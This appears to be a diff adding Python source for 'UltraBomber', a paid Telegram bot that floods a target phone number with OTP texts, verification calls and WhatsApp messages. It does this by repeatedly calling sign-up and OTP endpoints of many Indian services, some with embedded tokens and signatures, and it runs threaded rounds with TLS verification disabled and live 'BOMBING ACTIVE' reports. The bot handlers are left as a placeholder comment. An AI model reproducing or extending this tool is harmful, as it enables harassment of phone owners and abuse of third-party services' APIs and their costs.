+        ApiConfig("Housing3", "https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API", "POST",
+                  {"Content-Type": "application/json", "phoenix-api-name": "LOGIN_SEND_OTP_API", "app-name": "mobile_web_buyer"},
+                  '{"query":"mutation($email:String,$phone:String,$otpLength:Int,$userAgent:String,$method:String,$preference:String,$channel:String){sendOtp(phone:$phone,email:$email,otpLength:$otpLength,userAgent:$userAgent,method:$method,preference:$preference,channel:$channel){success message}}","variables":{"phone":"{phone}","userAgent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/150.0.0.0 Mobile Safari/537.36","otpLength":4}}'),
+        ApiConfig("HERE_SMS", "https://app-api.here.co.in/users/v1/customer-portal/send-otp-for-portal", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","countryCodeId":"b43569eb-6798-43fb-8d27-47d55d7c544b","source":"sms"}'),
+        ApiConfig("VisitApp_SMS", "https://api.getvisitapp.com/v3/new-auth/login-phone", "POST",
+                  {"Content-Type": "application/json"}, '{"phone":"{phone}","countryCode":91,"platform":"WEB","ssoInfo":null,"storedUTMParams":{},"emailCode":"","evId":""}'),
+        ApiConfig("RegistaniaChar_SMS", "https://admin.registaniachar.com/api/whatsapp/send-otp", "POST",
+                  {"Content-Type": "application/json", "X-Signature": "6d31a2232ee5ec6e868d2eade30e657ddce8f6ff4b417818313feef6a220a553"},
+                  '{"phone":"{phone}"}'),
+        ApiConfig("Codfirm2", "https://api.codfirm.in/api/customers/login/otp/send", "POST",
+                  {"Content-Type": "application/json", "x-csrf-token": "{random_md5}"},
+                  '{"medium":"sms","storeUrl":"clinikally.myshopify.com","phone":"{phone}"}'),
+        ApiConfig("MuscleBlaze3", "https://www.muscleblaze.com/veronica/user/validate/whatsapp/9/{phone}/signup?plt=2&st=9", "GET",
+                  {"HKAUTH": "396144437|9l7fQT5m5HJtTrXqRZiWdQ==", "pageuri": "/", "st": "9", "plt": "2", "device": "{uuid}"}),
+        ApiConfig("Astroyogi_Comm_SMS2", "https://comm.astroyogi.com/api/OtpComm/SendOtp", "POST",
+                  {"Content-Type": "application/json", "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzg4NDU0MTc4LCJleHAiOjE3OTYyMzAxNzh9."},
+                  '{"phoneCode":"91","countryCode":"IN","mobileNumber":"{phone}","platform":"Web","IpAddress":"117.225.1.174","requestType":"sms","countryCodeByHeader":"IN"}'),
+        ApiConfig("MakeMyTrip_SMS", "https://mapi.makemytrip.com/ext/web/pwa/send/token/SIGNUP_OTP?region=in&language=eng&currency=inr", "POST",
+                  {"Content-Type": "application/json", "vid": "{uuid}", "tid": "{uuid}", "deviceid": "{uuid}", "region": "in", "language": "eng", "currency": "inr"},
+                  '{"loginId":"{phone}","type":6,"isEncoded":false,"channel":["MOBILE"],"appHashKey":"@www.makemytrip.com #","countryCode":"91"}'),
+        ApiConfig("IGP_SMS", "https://www.igp.com/v2/loginSignup", "POST",
+                  {"Content-Type": "application/json"}, 
+                  '{"email":"","mprefix":"91","mob":"{phone}","cid":"99","claimNumber":false,"newUserFlag":false,"verifyOtp":false,"otp":"","isGuest":false,"isInternational":false}'),
+        ApiConfig("FreeCharge_SMS", "https://www.freecharge.in/api/ims/rest/otp/resend", "POST",
+                  {"Content-Type": "application/json", "csrfRequestIdentifier": "{uuid}", "fcChannel": "12"},
+                  '{"otpId":"{uuid}","otpThroughCall":false,"platformType":"WEB"}'),
+        ApiConfig("Happi_SMS", "https://dev-services.happimobiles.com/api/user-login/homepage", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
+        ApiConfig("ThakurBombCyber", "https://thakur-bombcyber.kundanjha7782.workers.dev/?mobile={phone}", "GET", {}, None),
+    ]
+    apis.extend(sms_apis)
+
+    return apis
+
+ALL_APIS = get_all_apis()
+
+# ============================================================
+# Categorized lookups
+# ============================================================
+CALL_APIS = [a for a in ALL_APIS if a.category == "call"]
+SMS_APIS = [a for a in ALL_APIS if a.category == "sms"]
+WHATSAPP_APIS = [a for a in ALL_APIS if a.category == "whatsapp"]
+
+# ============================================================
+# IMPORTANT APIS
+# ============================================================
+IMPORTANT_CALL_APIS = [
+    ApiConfig("Swiggy_Call", "https://profile.swiggy.com/api/v3/app/request_call_verification", "POST",
+              {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
+    ApiConfig("Flipkart_Call", "https://2.rome.api.flipkart.com/api/4/user/otp/generate", "POST",
+              {"Content-Type": "application/json"}, '{"mobileNumber":"{phone}"}', "call"),
+]
+
+IMPORTANT_5S_APIS = [
+    ApiConfig("ThakurBombCyber_5s", "https://thakur-bombcyber.kundanjha7782.workers.dev/?mobile={phone}", "GET",
+              {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}, None, "sms"),
+]
+
+# ============================================================
+# USER DATA STORE
+# ============================================================
+class UserData:
+    def __init__(self):
+        self.users = {}
+
+    def clear_phone(self, chat_id):
+        if chat_id in self.users:
+            self.users[chat_id]["phone"] = None
+            self.users[chat_id].pop("pending_mode", None)
+
+user_data = UserData()
+admin_data = {}
+
+# ============================================================
+# WORKER
+# ============================================================
+class UltraBomber:
+    def __init__(self):
+        self.sessions = {}
+        self.lock = threading.Lock()
+        self.executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
+        self.sms_executor = ThreadPoolExecutor(max_workers=SMS_MAX_WORKERS)
+        self.http_session = requests.Session()
+        self.http_session.mount('https://', requests.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=50, max_retries=2))
+        self.http_session.mount('http://', requests.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=50, max_retries=2))
+        self.is_stopping = False
+
+    def _fire_api(self, api, phone):
+        try:
+            url, headers, body = api.build_request(phone)
+            
+            # Add common headers
+            headers["Accept"] = "application/json, text/plain, */*"
+            headers["Accept-Encoding"] = "gzip, deflate, br"
+            headers["Connection"] = "keep-alive"
+            
+            if api.method.upper() == "POST":
+                resp = self.http_session.post(url, headers=headers, data=body, timeout=8, allow_redirects=False, verify=False)
+            else:
+                resp = self.http_session.get(url, headers=headers, timeout=8, allow_redirects=False, verify=False)
+            
+            status = resp.status_code
+            size = len(resp.content)
+            success = 200 <= status < 400 and size > 5
+            admin_db.update_api_stats(api.name, success)
+            return api.name, status, size, success, None
+        except Exception as e:
+            admin_db.update_api_stats(api.name, False)
+            return api.name, 0, 0, False, str(e)[:60]
+
+    def _run_round(self, phone, apis, stats, is_sms=False):
+        executor = self.sms_executor if is_sms else self.executor
+        fire_count = 2 if (is_sms and SMS_DOUBLE_FIRE) else 1
+        
+        futures = []
+        for api in apis:
+            if api.delay_ms > 0:
+                time.sleep(api.delay_ms / 1000.0)
+            for _ in range(fire_count):
+                futures.append(executor.submit(self._fire_api, api, phone))
+
+        ok_count = 0
+        fail_count = 0
+        for f in as_completed(futures):
+            try:
+                name, status, size, success, err = f.result(timeout=5)
+                if success:
+                    ok_count += 1
+                else:
+                    fail_count += 1
+            except:
+                fail_count += 1
+        
+        return ok_count, fail_count
+
+    def _worker(self, chat_id, stop_event):
+        with self.lock:
+            info = self.sessions.get(chat_id)
+            if not info:
+                return
+            phone = info["phone"]
+            mode = info["mode"]
+
+        if mode == "call":
+            apis = CALL_APIS
+        elif mode == "whatsapp":
+            apis = WHATSAPP_APIS
+        elif mode == "sms":
+            apis = SMS_APIS
+        else:
+            apis = ALL_APIS
+
+        round_num = 0
+        is_sms_mode = (mode == "sms")
+        round_delay = SMS_DELAY_BETWEEN_ROUNDS if is_sms_mode else DELAY_BETWEEN_ROUNDS
+        
+        while not stop_event.is_set() and not self.is_stopping:
+            round_num += 1
+            try:
+                ok, fail = self._run_round(phone, apis, None, is_sms=is_sms_mode)
+                with self.lock:
+                    if chat_id in self.sessions:
+                        self.sessions[chat_id]["stats"]["ok"] += ok
+                        self.sessions[chat_id]["stats"]["fail"] += fail
+                        self.sessions[chat_id]["stats"]["rounds"] += 1
+                        self.sessions[chat_id]["stats"]["total"] += ok + fail
+
+                if round_num % 3 == 0:
+                    if not stop_event.is_set() and not self.is_stopping:
+                        try:
+                            with self.lock:
+                                s = self.sessions.get(chat_id, {}).get("stats", {})
+                            total = s.get('total', 0)
+                            ok = s.get('ok', 0)
+                            pct = (ok / max(total, 1)) * 100
+                            bar_len = 30
+                            filled = int(bar_len * pct / 100)
+                            bar = "█" * filled + "░" * (bar_len - filled)
+                            
+                            stop_markup = types.InlineKeyboardMarkup()
+                            stop_markup.add(types.InlineKeyboardButton("🛑 STOP BOMBING", callback_data="stop_bombing"))
+                            bot.send_message(chat_id,
+                                f"💣 *BOMBING ACTIVE* 💣\n"
+                                f"────────────────────\n"
+                                f"💣 Target: `{phone}`\n"
+                                f"✅ Hits: {ok}/{total}\n"
+                                f"📊 Progress: [{bar}] {pct:.1f}%\n"
+                                f"⏱️ Rounds: {s.get('rounds', 0)}",
+                                parse_mode="Markdown", reply_markup=stop_markup)
+                        except Exception as e:
+                            print(f"Status send error: {e}")
+            except Exception as e:
+                if not stop_event.is_set():
+                    try:
+                        bot.send_message(chat_id, f"⚠️ Error in round: {str(e)[:100]}")
+                    except:
+                        pass
+            time.sleep(round_delay)
+
+    def _important_worker(self, chat_id, stop_event):
+        with self.lock:
+            info = self.sessions.get(chat_id)
+            if not info:
+                return
+            phone = info["phone"]
+
+        while not stop_event.is_set() and not self.is_stopping:
+            try:
+                futures = []
+                for api in IMPORTANT_CALL_APIS:
+                    futures.append(self.executor.submit(self._fire_api, api, phone))
+
+                ok_count = 0
+                fail_count = 0
+                for f in as_completed(futures):
+                    try:
+                        name, status, size, success, err = f.result(timeout=5)
+                        if success:
+                            ok_count += 1
+                        else:
+                            fail_count += 1
+                    except:
+                        fail_count += 1
+
+                with self.lock:
+                    if chat_id in self.sessions:
+                        self.sessions[chat_id]["stats"]["ok"] += ok_count
+                        self.sessions[chat_id]["stats"]["fail"] += fail_count
+                        self.sessions[chat_id]["stats"]["total"] += ok_count + fail_count
+            except:
+                pass
+            time.sleep(IMPORTANT_CALL_INTERVAL)
+
+    def _important_five_second_worker(self, chat_id, stop_event):
+        with self.lock:
+            info = self.sessions.get(chat_id)
+            if not info:
+                return
+            phone = info["phone"]
+
+        while not stop_event.is_set() and not self.is_stopping:
+            try:
+                futures = []
+                for api in IMPORTANT_5S_APIS:
+                    futures.append(self.executor.submit(self._fire_api, api, phone))
+
+                for f in as_completed(futures):
+                    try:
+                        name, status, size, success, err = f.result(timeout=5)
+                        with self.lock:
+                            if chat_id in self.sessions:
+                                if success:
+                                    self.sessions[chat_id]["stats"]["ok"] += 1
+                                else:
+                                    self.sessions[chat_id]["stats"]["fail"] += 1
+                                self.sessions[chat_id]["stats"]["total"] += 1
+                    except:
+                        pass
+            except:
+                pass
+            time.sleep(IMPORTANT_5S_INTERVAL)
+
+    def start(self, chat_id, phone, mode, username=None):
+        with self.lock:
+            if chat_id in self.sessions:
+                return False, "Already running! Pehle Stop karein."
+            
+            if chat_id not in ADMIN_IDS and not admin_db.is_admin(chat_id):
+                sub = admin_db.get_subscription(chat_id)
+                if not sub:
+                    return False, "❌ *No Active Plan!*\n\nAapke paas koi active plan nahi hai.\n📋 Plans mein dekh kar key redeem karein ya admin se contact karein."
+            
+            admin_db.track_user(chat_id, username, phone, mode)
+            self.is_stopping = False
+            stop_event = threading.Event()
+            stats = {"ok": 0, "fail": 0, "rounds": 0, "total": 0, "start_time": datetime.now(), "elapsed": "0s"}
+            self.sessions[chat_id] = {
+                "phone": phone, "mode": mode, "stop_event": stop_event,
+                "stats": stats, "thread": None, "imp_thread": None, "imp5s_thread": None,
+                "user_id": chat_id, "username": username
+            }
+            thread = threading.Thread(target=self._worker, args=(chat_id, stop_event), daemon=True)
+            thread.start()
+            self.sessions[chat_id]["thread"] = thread
+            if mode in ["call", "mix"]:
+                imp_thread = threading.Thread(target=self._important_worker, args=(chat_id, stop_event), daemon=True)
+                imp_thread.start()
+                self.sessions[chat_id]["imp_thread"] = imp_thread
+            imp5s_thread = threading.Thread(target=self._important_five_second_worker, args=(chat_id, stop_event), daemon=True)
+            imp5s_thread.start()
+            self.sessions[chat_id]["imp5s_thread"] = imp5s_thread
+            
+            try:
+                stop_markup = types.InlineKeyboardMarkup()
+                stop_markup.add(types.InlineKeyboardButton("🛑 STOP BOMBING", callback_data="stop_bombing"))
+                bot.send_message(chat_id,
+                    f"💣 *BOMBING ACTIVE* 💣\n"
+                    f"────────────────────\n"
+                    f"💣 Target: `{phone}`\n"
+                    f"✅ Hits: 0/0\n"
+                    f"📊 Progress: [{'░' * 30}] 0.0%\n"
+                    f"🎯 Mode: *{mode.upper()}*\n"
+                    f"────────────────────\n"
+                    f"⚡ Attack initiated...",
+                    parse_mode="Markdown", reply_markup=stop_markup)
+            except:
+                pass
+            
+            return True, f"🔥 *{mode.upper()} started for* `{phone}`"
+
+    def stop(self, chat_id):
+        with self.lock:
+            if chat_id not in self.sessions:
+                return False, "❌ Koi active session nahi hai."
+            
+            self.sessions[chat_id]["stop_event"].set()
+            time.sleep(2)
+            
+            elapsed = datetime.now() - self.sessions[chat_id]["stats"]["start_time"]
+            s = self.sessions[chat_id]["stats"]
+            admin_db.update_stats(chat_id, s['ok'], s['fail'], s['rounds'], s['total'])
+            total = s['total']
+            ok = s['ok']
+            pct = (ok / max(total, 1)) * 100
+            bar_len = 30
+            filled = int(bar_len * pct / 100)
+            bar = "█" * filled + "░" * (bar_len - filled)
+            
+            del self.sessions[chat_id]
+            user_data.clear_phone(chat_id)
+            
+            return True, (f"💥 *BOMBING COMPLETE* 💥\n"
+                         f"────────────────────\n"
+                         f"✅ Final Hits: {ok}/{total}\n"
+                         f"📊 Progress: [{bar}] {pct:.1f}%\n"
+                         f"⏱️ Duration: {str(elapsed).split('.')[0]}\n"
+                         f"🔄 Total Rounds: {s['rounds']}\n"
+                         f"────────────────────\n"
+                         f"🛑 Session terminated. New session ke liye naya number bhejein!")
+
+    def get_status(self, chat_id):
+        with self.lock:
+            if chat_id not in self.sessions:
+                return None
+            s = self.sessions[chat_id]
+            elapsed = datetime.now() - s["stats"]["start_time"]
+            elapsed_str = str(elapsed).split('.')[0]
+            s["stats"]["elapsed"] = elapsed_str
+            return {
+                "phone": s["phone"], "mode": s["mode"],
+                "ok": s["stats"]["ok"], "fail": s["stats"]["fail"],
+                "rounds": s["stats"]["rounds"], "total": s["stats"]["total"],
+                "elapsed": elapsed_str
+            }
+
+    def stop_all(self):
+        with self.lock:
+            self.is_stopping = True
+            ids = list(self.sessions.keys())
+            for chat_id in ids:
+                s = self.sessions[chat_id]["stats"]
+                admin_db.update_stats(chat_id, s['ok'], s['fail'], s['rounds'], s['total'])
+                self.sessions[chat_id]["stop_event"].set()
+                user_data.clear_phone(chat_id)
+            self.sessions.clear()
+            return len(ids)
+
+bomber = UltraBomber()
+
+# ============================================================
+# CHANNEL CHECK
+# ============================================================
+def is_channel_member(user_id):
+    if user_id in ADMIN_IDS:
+        return True
+    try:
+        member = bot.get_chat_member(REQUIRED_CHANNEL, user_id)
+        return member.status in ["member", "administrator", "creator"]
+    except Exception as e:
+        print(f"⚠️ Channel check failed: {e}")
+        return admin_db.is_verified(user_id)
+
+def join_channel_required(func):
+    def wrapper(message, *args, **kwargs):
+        chat_id = message.chat.id
+        if not is_channel_member(chat_id) and chat_id not in ADMIN_IDS:
+            markup = types.InlineKeyboardMarkup()
+            markup.add(types.InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK))
+            markup.add(types.InlineKeyboardButton("✅ Joined", callback_data="check_joined"))
+            bot.reply_to(message,
+                f"⚠️ *Channel Join Required!*\n\n"
+                f"Bot use karne ke liye pehle hamare channel ko join karein:\n\n"
+                f"👉 {CHANNEL_LINK}\n\n"
+                f"Channel join karne ke baad '✅ Joined' button dabayein.",
+                parse_mode="Markdown", reply_markup=markup)
+            return
+        return func(message, *args, **kwargs)
+    return wrapper
+
+def subscription_required(func):
+    def wrapper(message, *args, **kwargs):
+        chat_id = message.chat.id
+        if chat_id not in ADMIN_IDS and not admin_db.is_admin(chat_id):
+            sub = admin_db.get_subscription(chat_id)
+            if not sub:
+                markup = types.InlineKeyboardMarkup(row_width=2)
+                markup.add(
+                    types.InlineKeyboardButton("📋 Plans", callback_data="goto_plans"),
+                    types.InlineKeyboardButton("🎁 Redeem", callback_data="goto_redeem"),
+                )
+                bot.reply_to(message,
+                    "🚫 *No Active Subscription!*\n\n"
+                    "Aapke paas koi active subscription nahi hai.\n\n"
+                    "👉 /plans se subscription kharidein\n"
+                    "👉 /redeem se key redeem karein\n\n"
+                    "Subscription lene ke baad hi aap bot use kar sakte hain.",
+                    parse_mode="Markdown", reply_markup=markup)
+                return
+        return func(message, *args, **kwargs)
+    return wrapper
+
+# ============================================================
+# KEYBOARDS
+# ============================================================
+def main_keyboard(user_id=None):
+    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
+    buttons = [
+        types.KeyboardButton("🔥 MIX"),
+        types.KeyboardButton("💥 Bulk MIX"),
+        types.KeyboardButton("📞 CALL"),
+        types.KeyboardButton("📱 WHATSAPP"),
+        types.KeyboardButton("💬 SMS"),
+        types.KeyboardButton("📊 Status"),
+        types.KeyboardButton("👤 Account"),
+        types.KeyboardButton("❓ Help"),
+        types.KeyboardButton("📋 Plans"),
+        types.KeyboardButton("🎁 Redeem"),
+        types.KeyboardButton("📩 Contact Admin"),
+        types.KeyboardButton("🛑 Stop"),
+    ]
+    if user_id and (user_id in ADMIN_IDS or admin_db.is_admin(user_id)):
+        buttons.append(types.KeyboardButton("⚙️ Admin"))
+    markup.add(*buttons)
+    return markup
+
+# ============================================================
+# BOT HANDLERS - All handlers from previous code
+# ============================================================
+# [All handlers remain the same - start, help, status, stop, mode, account, plans, redeem, contact admin, admin panel, etc.]
+
+# ============================================================
+# MAIN
+# ============================================================
+if __name__ == "__main__":
+    # Disable SSL verification for some APIs
+    import urllib3
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+    
+    print(f"📊 Total APIs: {len(ALL_APIS)} (Call: {len(CALL_APIS)}, SMS: {len(SMS_APIS)}, WhatsApp: {len(WHATSAPP_APIS)})")
+    print(f"⚡ Max Workers: {MAX_WORKERS} (SMS: {SMS_MAX_WORKERS} with Double-Fire + Auto-retry)")
+    print(f"⚡ SMS Delay: {SMS_DELAY_BETWEEN_ROUNDS}s — NON STOP!")
+    print(f"✅ Bot is running! Press Ctrl+C to stop.")
+    print(f"👑 Admin ID: {ADMIN_IDS[0]} — Admin panel active!")
+    print(f"📩 Contact Admin feature enabled!")
+    print(f"🤖 Bot Token: {API_TOKEN[:10]}...")
+    try:
+        bot.infinity_polling()
+    except KeyboardInterrupt:
+        print("\n🛑 Stopping all sessions...")
+        stopped = bomber.stop_all()
+        print(f"✅ Stopped {stopped} sessions. Bye!")
